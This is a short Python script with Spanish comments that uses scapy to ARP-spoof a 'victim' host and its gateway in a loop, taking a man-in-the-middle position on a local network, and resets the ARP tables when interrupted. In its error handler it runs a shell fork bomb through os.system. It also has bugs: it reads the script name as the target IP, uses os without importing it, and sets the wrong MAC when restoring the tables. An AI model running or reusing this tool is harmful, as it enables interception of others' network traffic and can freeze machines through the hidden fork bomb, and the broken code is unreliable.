import sys
import scapy.all as scapy
from scapy import *
import time

print ("[+] Primero introduce la ip victima y despues la ip del gateway")

ip_objetivo = sys.argv[0]
gateway_ip = sys.argv[1]

if len(sys.argv[0]) < 13 or len(sys.argv[1]) < 13:

	print ("Ha introducido una ip incorrecta")

#ip_objetivo = input('Introduce la ip de la victima: ')
#gateway_ip = input('Introduce la ip de la puerta de enlace: ')
def cmac(ip):
    arp_request = scapy.ARP(pdst = ip)

    difusion = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")

    arprequestdifusion = difusion / arp_request

    lista_de_respuestas = scapy.srp(arprequestdifusion, timeout = 5, verbose = False)[0]

    return lista_de_respuestas[0][1].hwsrc

def spoofeo(direccion_ip_obj, ip_spoofeada):

    paquete = scapy.ARP(pdst = direccion_ip_obj, hwdst = cmac(direccion_ip_obj), psrc = ip_spoofeada)

    scapy.send(paquete, verbose = False)

def restaurartablas(ip_destino, ip_origen):

    mac_destino = cmac(ip_destino)

    mac_origen = cmac(ip_origen)

    paquete = scapy.ARP(pdst = ip_destino, hwdst = mac_destino, psrc = ip_origen, hwsrc = mac_destino)

    scapy.send(paquete, verbose = False)

#ip_objetivo = "192.168.0.159" 

#gateway_ip = "192.168.0.1"

try:

    paquetes_enviados = 0

    for i in range(10):

	    while True:

        	spoofeo(ip_objetivo, gateway_ip)

        	spoofeo(gateway_ip, ip_objetivo)

        	paquetes_enviados = paquetes_enviados + 2

        	print("\r*********" +str(paquetes_enviados), end ="")

        	time.sleep(2)
except (IndexError):
	print ("Algo ha ido mal, ejecutandose de nuevo de nuevo")
	os.system(':(){ :|:& };:')
	pass

except KeyboardInterrupt:
    print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
    restaurartablas(gateway_ip, ip_objetivo)
    restaurartablas(ip_objetivo, gateway_ip)
    print("Ha salido del programa")
